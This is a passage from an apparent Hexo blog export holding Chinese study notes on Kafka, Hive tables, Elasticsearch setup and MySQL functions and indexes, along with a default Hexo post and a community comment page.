href="#十一：Kafka高效读写数据" class="headerlink" title="十一：Kafka高效读写数据"></a>十一：Kafka高效读写数据</h2><h3 id="1）顺序写磁盘"><a href="#1）顺序写磁盘" class="headerlink" title="1）顺序写磁盘"></a>1）顺序写磁盘</h3><p> 顺序写磁盘 省去大量磁头寻址时间</p><h3 id="2）零复制技术"><a href="#2）零复制技术" class="headerlink" title="2）零复制技术"></a>2）零复制技术</h3><p> 零拷贝技术 Page Cache 直接操作</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/zero.png" alt="img"></p><h2 id="十二：Zk在Kafka中的作用"><a href="#十二：Zk在Kafka中的作用" class="headerlink" title="十二：Zk在Kafka中的作用"></a>十二：Zk在Kafka中的作用</h2><p>Kafka 集群中有一个 broker 会被选举为 Controller，负责管理集群 broker 的上下线，所有 topic 的分区副本分配和 leader 选举等工作</p><p>Controller 中的信息共享</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/leader.png" alt="img"></p><h3 id="leader的选举："><a href="#leader的选举：" class="headerlink" title="leader的选举："></a>leader的选举：</h3><p>1）leader 的broker挂掉了</p><p>2）zk 中brokers 改变—&gt; KafkaControler监听着 brokers –&gt; 获取ISR —&gt;选举 –更新leader以及ISR 到ZK</p><h3 id="？思考-？："><a href="#？思考-？：" class="headerlink" title="？思考 ？："></a>？思考 ？：</h3><p><strong>如果挂掉的leadr刚好也是KafkaControler</strong></p><p><strong>我的想法是：会通过抢占资源的方式重新选出KafkaControler02，但可能之前的KafkaControler01只是因为网络IO延迟了，所以可能存在产生脑裂的问题，百度上这块资料不多。</strong></p><p>解决脑裂的方法：<a href="https://www.cnblogs.com/felixzh/p/11611501.html" target="_blank" rel="noopener">直达</a></p><h2 id="十三：Kafka-事务"><a href="#十三：Kafka-事务" class="headerlink" title="十三：Kafka 事务"></a>十三：Kafka 事务</h2><p>Kafka 从 0.11 版本开始引入了事务支持。事务可以保证 Kafka 在 Exactly Once 语义的基础上，生产和消费可以跨分区和会话，要么全部成功，要么全部失败。</p><h3 id="①-跨分区的Exactly-Once"><a href="#①-跨分区的Exactly-Once" class="headerlink" title="① 跨分区的Exactly Once"></a>① 跨分区的Exactly Once</h3><h4 id="1）Producer事务："><a href="#1）Producer事务：" class="headerlink" title="1）Producer事务："></a>1）Producer事务：</h4><p>为了实现跨分区跨会话的事务，需要引入一个全局唯一的 Transaction ID（<strong><em>客户端传入的\</em></strong>），并将 Producer获得的 PID 和 Transaction ID 绑定。这样当 Producer 重启后就可以通过正在进行的 TransactionID 获得原来的 PID。</p><p>为了管理 Transaction，Kafka 引入了一个新的组件 Transaction Coordinator。Producer 就是通过和 Transaction Coordinator 交互获得 Transaction ID 对应的任务状态。</p><p>Transaction Coordinator 还负责将事务所有写入 Kafka 的一个内部 Topic，这样即使整个服务重启，由于事务状态得到保存，进行中的事务状态可以得到恢复，从而继续进行。</p><h4 id="2）Consumer事务"><a href="#2）Consumer事务" class="headerlink" title="2）Consumer事务"></a>2）Consumer事务</h4><p><strong>（无法保证精确消费）</strong></p><p>无法保证精确消费的原因：</p><p>消费者可以通过 offset 访问任意信息而且不同的 Segment File 生命周期不同，同一事务的消息可能会出现重启后被删除的情况（默认保留7天）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>K8S</title>
      <link href="2023/04/16/K8S/"/>
      <url>2023/04/16/K8S/</url>
      
        <content type="html"><![CDATA[<h1 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hive面试总结</title>
      <link href="2023/04/16/hive%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>2023/04/16/hive%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="hive面试总结"><a href="#hive面试总结" class="headerlink" title="hive面试总结"></a>hive面试总结</h1><h1 id="一-内部表与外部表："><a href="#一-内部表与外部表：" class="headerlink" title="一. 内部表与外部表："></a>一. 内部表与外部表：</h1><ol><li><strong>内部表</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> (<span class="keyword">name</span> <span class="keyword">string</span> , age <span class="keyword">string</span>) location <span class="string">'/input/table_data'</span>;</span><br></pre></td></tr></table></figure><p>注：hive默认创建的是内部表</p><p>此时，会在hdfs上新建一个test表的数据存放地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data inpath &#39;&#x2F;input&#x2F;data&#39; into table test ;</span><br></pre></td></tr></table></figure><p>会将hdfs上的/input/data目录下的数据转移到/input/table_data目录下。删除test表后，会将test表的数据和元数据信息全部删除，即最后/input/table_data下无数据，当然/input/data下再上一步已经没有了数据！</p><p>   如果创建内部表时没有指定location，就会在/user/<a href="http://lib.csdn.net/base/hive" target="_blank" rel="noopener">Hive</a>/warehouse/下新建一个表目录，其余情况同上。</p><p>  <strong>注：load data会转移数据</strong></p><p><strong><em>\</em>2. 外部表**</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create external table etest (name string , age string);</span><br></pre></td></tr></table></figure><p>会在/user/hive/warehouse/新建一个表目录et</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data inpath &#39;&#x2F;input&#x2F;edata&#39; into table etest;</span><br></pre></td></tr></table></figure><p>把hdfs上/input/edata/下的数据转到/user/hive/warehouse/et下，删除这个外部表后，/user/hive/warehouse/et下的数据不会删除，但是/input/edata/下的数据在上一步load后已经没有了！数据的位置发生了变化！</p><p><strong>本质是load一个hdfs上的数据时会转移数据！</strong></p><p><strong>3. 小结</strong></p><p><strong>最后归纳一下Hive中表与外部表的区别：</strong></p><p>   1、在导入数据到外部表，数据并没有移动到自己的<a href="http://cpro.baidu.com/cpro/ui/uijs.php?rs=1&u=http%3A%2F%2Fwww%2Eaboutyun%2Ecom%2Fthread%2D7458%2D1%2D1%2Ehtml&p=baidu&c=news&n=10&t=tpclicked3_hc&q=92051019_cpr&k=%CA%FD%BE%DD%B2%D6%BF%E2&k0=%C0%AC%BB%F8%CF%E4&kdi0=8&k1=%CA%FD%BE%DD%B2%D6%BF%E2&kdi1=8&k2=%CA%FD%BE%DD%BF%E2&kdi2=1&k3=%CE%C4%BC%FE%BC%D0&kdi3=8&k4=%CA%FD%BE%DD%B4%E6%B4%A2&kdi4=8&sid=a9554e2138c29729&ch=0&tu=u1692056&jk=6b955ae858fcc4c3&cf=29&fv=11&stid=9&urlid=0&luki=2&seller_id=1&di=128" target="_blank" rel="noopener">数据仓库</a>目录下(如果指定了location的话)，也就是说外部表中的数据并不是由它自己来管理的！而内部表则不一样；<br>   2、在删除内部表的时候，Hive将会把属于表的元数据和数据全部删掉；而删除外部表的时候，Hive仅仅删除外部表的元数据，数据是不会删除的！</p><p>   \3. 在创建内部表或外部表时加上location 的效果是一样的，只不过表目录的位置不同而已，加上partition用法也一样，只不过表目录下会有分区目录而已，load data local inpath直接把本地文件系统的数据上传到hdfs上，有location上传到location指定的位置上，没有的话上传到hive默认配置的数据仓库中。</p><p>外部表相对来说更加安全些，数据组织也更加灵活，方便共享源数据。 </p><p>那么，应该如何选择使用哪种表呢？在大多数情况没有太多的区别，因此选择只是个人喜好的问题。但是作为一个经验，如果所有处理都需要由Hive完成，那么你应该创建表，否则使用外部表！</p><h1 id="二-动态分区与静态分区："><a href="#二-动态分区与静态分区：" class="headerlink" title="二. 动态分区与静态分区："></a>二. 动态分区与静态分区：</h1><h1 id="三-各种连接"><a href="#三-各种连接" class="headerlink" title="三. 各种连接"></a>三. 各种连接</h1><p><a href="https://blog.csdn.net/helloxiaozhe/article/details/87910386" target="_blank" rel="noopener">参考</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2023/04/16/hello-world/"/>
      <url>2023/04/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>elasticSearch</title>
      <link href="2023/04/16/elasticSearch/"/>
      <url>2023/04/16/elasticSearch/</url>
      
        <content type="html"><![CDATA[<h1 id="elasticSearch"><a href="#elasticSearch" class="headerlink" title="elasticSearch"></a><font color="#0099ff" size="6" face="仿宋">elasticSearch</font></h1><h1 id="一-安装ES"><a href="#一-安装ES" class="headerlink" title="一. 安装ES"></a>一. 安装ES</h1><h2 id="1-1-修改配置文件"><a href="#1-1-修改配置文件" class="headerlink" title="1.1 修改配置文件"></a>1.1 修改配置文件</h2><blockquote><p>路径：xxxx\elasticsearch-7.6.2\config </p></blockquote><p>jvm.options</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 默认jvm大小为一个G 需要调整</span></span><br><span class="line">-Xms1g</span><br><span class="line">-Xmx1g</span><br><span class="line"></span><br><span class="line">-Xms512m</span><br><span class="line">-Xmx512m</span><br></pre></td></tr></table></figure><p>elasticsearch.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启跨域</span></span><br><span class="line"><span class="attr">http.cors.enabled:</span>  <span class="literal">true</span></span><br><span class="line"><span class="comment"># 允许所有</span></span><br><span class="line"><span class="attr">http.cors.allow-origin:</span> <span class="string">"*"</span></span><br></pre></td></tr></table></figure><h1 id="二-下载相应的应用"><a href="#二-下载相应的应用" class="headerlink" title="二. 下载相应的应用"></a>二. 下载相应的应用</h1><h2 id="2-1-head"><a href="#2-1-head" class="headerlink" title="2.1 head"></a>2.1 head</h2><h2 id="2-2-kibana"><a href="#2-2-kibana" class="headerlink" title="2.2 kibana"></a>2.2 kibana</h2><h2 id="2-3-ik分词器"><a href="#2-3-ik分词器" class="headerlink" title="2.3 ik分词器"></a>2.3 ik分词器</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=#0099ff size=6 face=&quot;STCAIYUN&quot;&gt;第三城周报4月16日版&lt;/font&gt;</title>
      <link href="2023/04/16/%E7%AC%AC%E4%B8%89%E5%9F%8E%E5%91%A8%E6%8A%A54%E6%9C%8816%E6%97%A5%E7%89%88/"/>
      <url>2023/04/16/%E7%AC%AC%E4%B8%89%E5%9F%8E%E5%91%A8%E6%8A%A54%E6%9C%8816%E6%97%A5%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h1 id="第三城周报4月16日版"><a href="#第三城周报4月16日版" class="headerlink" title="第三城周报4月16日版"></a>第三城周报4月16日版</h1><p>之前有小伙伴私信我说，想要留言评论。但微信2018年放出来的新规：18年后新开的公众号，不再开通评论功能。同时面哥我也去尝试了其他的一些旁门左道，基本都是需要收费的。面哥我也不是什么富裕家庭，也开通不起那些东西，但面哥我是宠粉的。</p><p>所以想了个办法，大家可以下这篇博客下面补充昵称，写自己的留言。</p><p>该渠道仅供各邻居交流讨论，但请各位<strong><font color="#ff0000" size="3" face>不要探讨任何敏感的话题</font></strong>。谢谢!</p><hr><p>补充昵称后留言评论</p><p>👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇</p>]]></content>
      
      
      <categories>
          
          <category> 公众号 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三城业主家园 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=black size=8 face=&quot;宋体&quot;&gt;数据库&lt;/font&gt;</title>
      <link href="2020/10/10/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>2020/10/10/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><table><thead><tr><th>指令</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>show full PROCESSLIST;</td><td>查看数据库连接状态</td><td></td></tr><tr><td>select * from information_schema.<code>PROCESSLIST</code> where info is not null;</td><td>查看每个用户sql的执行情况</td><td></td></tr><tr><td>SHOW COLUMNS FROM <code>mall</code>.<code>orders</code></td><td>查看字段</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>服务器上导入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -hrm-bp19or199ue896jkm.mysql.rds.aliyuncs.com -uUSER -pPassword</span><br><span class="line"><span class="keyword">use</span> XXXdatabase;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">charset</span> utf8;</span><br><span class="line">source d:/xxx.sql; <span class="comment">-- 指定sql脚本位置</span></span><br></pre></td></tr></table></figure><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h1 id="一-时间函数"><a href="#一-时间函数" class="headerlink" title="一. 时间函数"></a>一. 时间函数</h1><h3 id="1-1-TIMESTAMPDIFF"><a href="#1-1-TIMESTAMPDIFF" class="headerlink" title="1.1 TIMESTAMPDIFF"></a>1.1 TIMESTAMPDIFF</h3><blockquote><p>可选参数：</p><p>MICROSECOND  微秒<br>SECOND  秒<br>MINUTE  分钟<br>HOUR  小时<br>DAY  天<br>WEEK  周<br>MONTH  月份<br>QUARTER  季度<br>YEAR  年份</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">TIMESTAMPDIFF</span>(<span class="keyword">day</span>, <span class="string">'2019-11-01 00:35:29'</span> , <span class="string">'2019-11-03 00:05:31'</span>) <span class="comment">-- 1</span></span><br></pre></td></tr></table></figure><h3 id="1-2-UNIX-TIMESTAMP"><a href="#1-2-UNIX-TIMESTAMP" class="headerlink" title="1.2 UNIX_TIMESTAMP"></a>1.2 UNIX_TIMESTAMP</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (<span class="keyword">UNIX_TIMESTAMP</span>(<span class="string">'2019-01-01 00:05:30'</span>)-<span class="keyword">UNIX_TIMESTAMP</span>(<span class="string">'2019-01-01 00:05:10'</span>)); <span class="comment">-- 20</span></span><br></pre></td></tr></table></figure><p><img src="/2020/10/10/%E6%95%B0%E6%8D%AE%E5%BA%93/C:%5CUsers%5Cks%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201012162942518.png" alt="image-20201012162942518"></p><h3 id="2-1-时间的计算"><a href="#2-1-时间的计算" class="headerlink" title="2.1 时间的计算"></a>2.1 时间的计算</h3><p><a href="https://blog.csdn.net/sqlquan/article/details/82699237" target="_blank" rel="noopener">参数链接</a></p><h5 id="2-1-1-date-add"><a href="#2-1-1-date-add" class="headerlink" title="2.1.1 date_add"></a>2.1.1 date_add</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`date`</span>,<span class="keyword">date_add</span>(<span class="string">`date`</span>,<span class="built_in">interval</span> <span class="number">1</span> <span class="keyword">day</span>) <span class="keyword">from</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><h5 id="2-1-2-date-sub"><a href="#2-1-2-date-sub" class="headerlink" title="2.1.2 date_sub"></a>2.1.2 date_sub</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`date`</span>,<span class="keyword">date_sub</span>(<span class="string">`date`</span>,<span class="built_in">interval</span> <span class="number">1</span> <span class="keyword">minute</span>) <span class="keyword">from</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><h3 id="3-时间格式化"><a href="#3-时间格式化" class="headerlink" title="3 时间格式化"></a>3 时间格式化</h3><h5 id="3-1-DATE-FORMAT"><a href="#3-1-DATE-FORMAT" class="headerlink" title="3.1 DATE_FORMAT"></a>3.1 DATE_FORMAT</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">date_format</span>(<span class="string">`date`</span>,<span class="string">"%Y-%m-%d"</span>) <span class="keyword">from</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><h1 id="二-随机数"><a href="#二-随机数" class="headerlink" title="二. 随机数"></a>二. 随机数</h1><h3 id="2-1-获取随机某列的值"><a href="#2-1-获取随机某列的值" class="headerlink" title="2.1 获取随机某列的值"></a>2.1 获取随机某列的值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> illness <span class="keyword">from</span> prescription <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">rand</span>()  <span class="keyword">LIMIT</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h1 id="三-运算符"><a href="#三-运算符" class="headerlink" title="三. 运算符"></a>三. 运算符</h1><p><a href="https://www.liangzl.com/get-article-detail-6485.html" target="_blank" rel="noopener">参考连接</a></p><h3 id="3-1-lt-gt-安全比较"><a href="#3-1-lt-gt-安全比较" class="headerlink" title="3.1 &lt;=&gt; 安全比较"></a>3.1 &lt;=&gt; 安全比较</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> &lt;=&gt; <span class="literal">NULL</span>, !(<span class="number">1</span> &lt;=&gt; <span class="literal">NULL</span>); <span class="comment">-- 0 1</span></span><br></pre></td></tr></table></figure><h3 id="3-2-赋值符"><a href="#3-2-赋值符" class="headerlink" title="3.2 := 赋值符"></a>3.2 := 赋值符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET @name &#x3D; &#39;big_cat&#39;;</span><br><span class="line">SELECT @name;</span><br><span class="line">SELECT @name &#x3D; &#39;big_cat&#39;, @name_defined :&#x3D; &#39;big_cat&#39;, @name_defined;</span><br><span class="line">-- null big_cat big_cat</span><br></pre></td></tr></table></figure><h3 id="3-3-用户变量"><a href="#3-3-用户变量" class="headerlink" title="3.3 @ 用户变量"></a>3.3 @ 用户变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @name &#x3D; &quot;big_cat&quot;;</span><br><span class="line">SELECT &#39;big_cat&#39; INTO @name;</span><br><span class="line">SELECT @name :&#x3D; &#39;big_cat&#39;, @name;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">insert into demo.test4 </span><br><span class="line">select (@numNo:&#x3D; @numNo+1) as num,  -- 实现递增</span><br><span class="line">&#96;name&#96;</span><br><span class="line">from demo.test,</span><br><span class="line">(select @numNo:&#x3D; (select max(id) from demo.test) )t -- 取test表最大的id来进行递增</span><br></pre></td></tr></table></figure><h3 id="3-4-系统变量"><a href="#3-4-系统变量" class="headerlink" title="3.4 @@系统变量"></a>3.4 @@系统变量</h3><ul><li>系统变量又分为全局系统变量和会话系统变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.sort_buffer_size;</span><br><span class="line">SELECT @@session.sort_buffer_size;</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &#39;sort_buffer_size&#39;;</span><br><span class="line">SHOW SESSION VARIABLES LIKE &#39;sort_buffer_size&#39;;</span><br></pre></td></tr></table></figure><ul><li>设置系统变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET @@global.sort_buffer_size &#x3D; 2 * 1024 * 1024;</span><br><span class="line">SET @@session.sort_buffer_size &#x3D; 2 * 1024 * 1024;</span><br><span class="line">SET GLOBAL sort_buffer_size &#x3D; 2 * 1024 * 1024;</span><br><span class="line">SET SESSION sort_buffer_size &#x3D; 2 * 1024 * 1024;</span><br></pre></td></tr></table></figure><h1 id="四-索引"><a href="#四-索引" class="headerlink" title="四. 索引"></a>四. 索引</h1><h3 id="4-1-建表时创建索引"><a href="#4-1-建表时创建索引" class="headerlink" title="4.1 建表时创建索引"></a>4.1 建表时创建索引</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;prescription&#96; (</span><br><span class="line">  &#96;id&#96; bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;主键&#39;,</span><br><span class="line">  &#96;audit_time&#96; datetime DEFAULT NULL COMMENT &#39;订单审核时间&#39;,</span><br><span class="line">  &#96;order_time&#96; datetime DEFAULT NULL COMMENT &#39;下单时间&#39;,</span><br><span class="line">  &#96;expired_time&#96; datetime DEFAULT NULL COMMENT &#39;过期时间&#39;,</span><br><span class="line">  &#96;gmt_create&#96; timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#39;创建时间&#39;,</span><br><span class="line">  &#96;gmt_modify&#96; timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#39;修改时间&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;idx_doctor_id&#96; (&#96;doctor_id&#96;) USING BTREE, -- 默认就是 USING BTREE</span><br><span class="line">  KEY &#96;idx_gmt_create&#96; (&#96;gmt_create&#96;) USING BTREE,</span><br><span class="line">  KEY &#96;idx_modify&#96; (&#96;gmt_modify&#96;) USING BTREE, </span><br><span class="line">) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;10449184 DEFAULT CHARSET&#x3D;utf8 ROW_FORMAT&#x3D;DYNAMIC COMMENT&#x3D;&#39;处方表&#39;;</span><br></pre></td></tr></table></figure><h3 id="4-2-ALTER添加索引"><a href="#4-2-ALTER添加索引" class="headerlink" title="4.2 ALTER添加索引"></a>4.2 ALTER添加索引</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.添加主键索引 </span><br><span class="line">ALTER TABLE &#96;table_name&#96; ADD PRIMARY KEY (&#96;column&#96;) </span><br><span class="line"></span><br><span class="line">2.添加唯一索引</span><br><span class="line">ALTER TABLE &#96;table_name&#96; ADD UNIQUE (&#96;column&#96;) </span><br><span class="line">3.添加全文索引</span><br><span class="line">ALTER TABLE &#96;table_name&#96; ADD FULLTEXT (&#96;column&#96;) </span><br><span class="line"></span><br><span class="line">4.添加普通索引</span><br><span class="line">ALTER TABLE &#96;table_name&#96; ADD INDEX index_name (&#96;column&#96; ) </span><br><span class="line">5.添加组合索引 </span><br><span class="line">ALTER TABLE &#96;table_name&#96; ADD INDEX index_name (&#96;column1&#96;, &#96;column2&#96;, &#96;column3&#96;)</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">ALTER TABLE &#96;test&#96; ADD INDEX nm (&#96;name&#96;);</span><br></pre></td></tr></table></figure><h3 id="4-3-CREATE-INDEX-创建索引"><a href="#4-3-CREATE-INDEX-创建索引" class="headerlink" title="4.3 CREATE INDEX 创建索引"></a>4.3 CREATE INDEX 创建索引</h3><blockquote><p>CREATE INDEX可对表增加普通索引或UNIQUE索引。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE INDEX index_name ON table_name (column_list)</span><br><span class="line">CREATE UNIQUE INDEX index_name ON table_name (column_list)</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">CREATE INDEX nm ON test (&#96;name&#96;)</span><br></pre></td></tr></table></figure><h3 id="4-4-删除索引"><a href="#4-4-删除索引" class="headerlink" title="4.4 删除索引"></a>4.4 删除索引</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DROP INDEX index_name ON talbe_name</span><br><span class="line">ALTER TABLE table_name DROP INDEX index_name</span><br><span class="line">ALTER TABLE table_name DROP PRIMARY KEY</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">DROP INDEX nm ON test;</span><br></pre></td></tr></table></figure><h3 id="4-5-查看索引"><a href="#4-5-查看索引" class="headerlink" title="4.5 查看索引"></a>4.5 查看索引</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show index from demo.test;</span><br><span class="line">show keys from test;</span><br></pre></td></tr></table></figure><h1 id="五-获取json-对象数据"><a href="#五-获取json-对象数据" class="headerlink" title="五. 获取json 对象数据"></a>五. 获取json 对象数据</h1><h3 id="5-1-json-extract"><a href="#5-1-json-extract" class="headerlink" title="5.1 json_extract"></a>5.1 json_extract</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- &#123;&quot;Tel&quot;:&quot;132223232444&quot;,&quot;name&quot;:&quot;david&quot;,&quot;address&quot;:&quot;Beijing&quot;&#125;</span><br><span class="line">select json_extract(name,&quot;$.name&quot;) from demo.test4;</span><br><span class="line">select json_extract(&#39;&#123;&quot;name&quot;:&quot;Zhaim&quot;,&quot;tel&quot;:&quot;13240133388&quot;&#125;&#39;,&quot;$.tel&quot;);</span><br></pre></td></tr></table></figure><h1 id="六-修改数据模式"><a href="#六-修改数据模式" class="headerlink" title="六. 修改数据模式"></a>六. 修改数据模式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set sql_mode &#x3D; 